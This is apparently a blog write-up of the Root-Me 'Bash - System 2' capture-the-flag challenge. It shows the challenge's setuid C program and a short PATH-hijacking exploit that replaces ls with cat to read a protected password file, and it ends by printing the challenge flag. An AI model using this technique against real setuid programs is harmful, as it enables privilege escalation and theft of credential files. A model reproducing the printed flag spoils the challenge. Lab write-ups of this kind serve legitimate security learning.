---
title: RootMe BashSystem2 WriteUp
date: 2023-10-03 
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# Bash - System 2

This one is very similar to bash system 1
We have next code in this challenge 

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
 
int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

and again we just need to change ls to cat

```shell
ln -s /bin/cat /tmp/ls
export PATH=/tmp:$PATH
./ch12
```

And there is our flag `8a95eDS/*e_T#`